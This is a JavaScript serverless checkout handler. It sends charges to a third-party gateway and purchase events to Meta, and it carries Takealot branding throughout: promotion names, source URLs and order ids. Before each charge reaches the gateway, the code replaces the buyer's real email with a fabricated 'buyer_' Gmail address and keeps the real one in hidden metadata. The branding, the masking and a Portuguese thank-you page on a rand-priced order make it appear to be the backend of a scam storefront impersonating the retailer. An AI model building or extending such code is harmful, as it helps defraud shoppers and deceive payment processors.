import crypto from 'node:crypto';
import fs from 'node:fs';
import path from 'node:path';

function getApiKey() {
  if (process.env.GHOST_API_KEY) return process.env.GHOST_API_KEY;
  try {
    const envPath = path.join(process.cwd(), '.env');
    if (fs.existsSync(envPath)) {
      const lines = fs.readFileSync(envPath, 'utf8').split('\n');
      for (const line of lines) {
        if (line.startsWith('GHOST_API_KEY=')) {
          return line.split('=')[1].trim();
        }
      }
    }
  } catch(e) {}
  return "";
}

function generateDeterministicBuyerEmail(realEmail) {
  if (!realEmail || typeof realEmail !== 'string') return "buyer_takealot@gmail.com";
  const clean = realEmail.trim().toLowerCase();
  let h1 = 0xdeadbeef, h2 = 0x41c64e6d;
  for (let i = 0; i < clean.length; i++) {
    const ch = clean.charCodeAt(i);
    h1 = Math.imul(h1 ^ ch, 2654435761);
    h2 = Math.imul(h2 ^ ch, 1597334677);
  }
  h1 = Math.imul(h1 ^ (h1 >>> 16), 2246822507) ^ Math.imul(h2 ^ (h2 >>> 13), 3266489909);
  h2 = Math.imul(h2 ^ (h2 >>> 16), 2246822507) ^ Math.imul(h1 ^ (h1 >>> 13), 3266489909);
  const hashHex = (4294967296 * (2097151 & h2) + (h1 >>> 0)).toString(16).padStart(10, '0').substring(0, 10);
  return `buyer_${hashHex}@gmail.com`;
}

function hashSha256(val) {
  if (!val) return undefined;
  return crypto.createHash('sha256').update(String(val).trim().toLowerCase()).digest('hex');
}

async function sendMetaCapiEvent(eventName, params = {}) {
  const pixelIds = (process.env.META_PIXEL_IDS || "3040652709472060,1671642977776583").split(",").map(p => p.trim());
  const token = process.env.META_ACCESS_TOKEN || "";
  if (!token) return;

  const userData = {
    client_ip_address: params.ip || '127.0.0.1',
    client_user_agent: params.userAgent || 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
  };

  if (params.email) userData.em = [hashSha256(params.email)];
  if (params.phone) userData.ph = [hashSha256(params.phone.replace(/[^0-9]/g, ''))];
  if (params.name) {
    const parts = String(params.name).trim().split(/\s+/);
    userData.fn = [hashSha256(parts[0])];
    if (parts.length > 1) userData.ln = [hashSha256(parts[parts.length - 1])];
  }
  if (params.fbclid) userData.fbc = `fb.1.${Date.now()}.${params.fbclid}`;

  const eventPayload = {
    event_name: eventName,
    event_time: Math.floor(Date.now() / 1000),
    event_id: params.eventId || `evt-${Date.now()}-${Math.floor(Math.random() * 100000)}`,
    event_source_url: params.sourceUrl || 'https://takealot.com',
    action_source: 'website',
    user_data: userData,
    custom_data: {
      currency: 'ZAR',
      value: Number(params.amount) || 0,
      content_name: params.title || 'Takealot Promotion',
      content_type: 'product',
      order_id: params.orderId
    }
  };

  for (const pid of pixelIds) {
    try {
      await fetch(`https://graph.facebook.com/v19.0/${pid}/events?access_token=${token}`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ data: [eventPayload] })
      });
    } catch(e) {}
  }
}

export default async function handler(req, res) {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type, Authorization, Idempotency-Key');

  if (req.method === 'OPTIONS') return res.status(200).end();
  if (req.method !== 'POST') return res.status(405).json({ error: 'Method not allowed' });

  const apiKey = getApiKey();
  const host = req.headers.host || "takealot.co.za";
  const protocol = req.headers['x-forwarded-proto'] || 'https';
  const baseUrl = `${protocol}://${host}`;

  try {
    let payload = typeof req.body === 'string' ? JSON.parse(req.body) : (req.body || {});

    const realEmail = (payload.real_email || payload.metadata?.real_email || (payload.customer_email && !payload.customer_email.startsWith('buyer_') ? payload.customer_email : '')).trim().toLowerCase();
    const maskedEmail = generateDeterministicBuyerEmail(realEmail || payload.customer_email);

    payload.customer_email = maskedEmail;
    if (!payload.metadata) payload.metadata = {};
    if (realEmail) payload.metadata.real_email = realEmail;
    payload.metadata.gateway_email = maskedEmail;

    const orderId = payload.metadata?.order_id || `TAK-${Math.floor(100000 + Math.random() * 900000)}`;
    payload.metadata.order_id = orderId;

    if (!payload.callback_url || payload.callback_url.startsWith('http://')) {
      payload.callback_url = `${baseUrl}/api/webhook`;
    }
    if (!payload.redirect_url || payload.redirect_url.startsWith('http://') || payload.redirect_url.startsWith('/')) {
      const redirectPath = payload.redirect_url && payload.redirect_url.startsWith('/') ? payload.redirect_url : '/obrigado.html';
      const sep = redirectPath.includes('?') ? '&' : '?';
      payload.redirect_url = `${baseUrl}${redirectPath}${sep}order=${encodeURIComponent(orderId)}&price=${encodeURIComponent(payload.amount || '')}`;
    }

    sendMetaCapiEvent('InitiateCheckout', {
      ip: (req.headers['x-forwarded-for'] || req.socket.remoteAddress || '').split(',')[0].trim(),
      userAgent: req.headers['user-agent'],
      email: realEmail || payload.customer_email,
      phone: payload.customer_phone,
      name: payload.metadata?.recipient_name,
      amount: payload.amount,
      title: payload.title,
      orderId: orderId,
      eventId: orderId,
      fbclid: payload.metadata?.fbclid,
      sourceUrl: `${baseUrl}/checkout.html`
    }).catch(() => {});

    const ghoResponse = await fetch("https://ghopay.app/api/v1/charges", {
      method: "POST",
      headers: {
        "Authorization": `Bearer ${apiKey}`,
        "Content-Type": "application/json",
        "Idempotency-Key": `tak-${orderId}-${Date.now()}`
      },
      body: JSON.stringify(payload)
    });

    const data = await ghoResponse.json();
    return res.status(ghoResponse.status).json(data);
  } catch (error) {
    return res.status(500).json({ error: error.message || "GhoPay request failed" });
  }
}
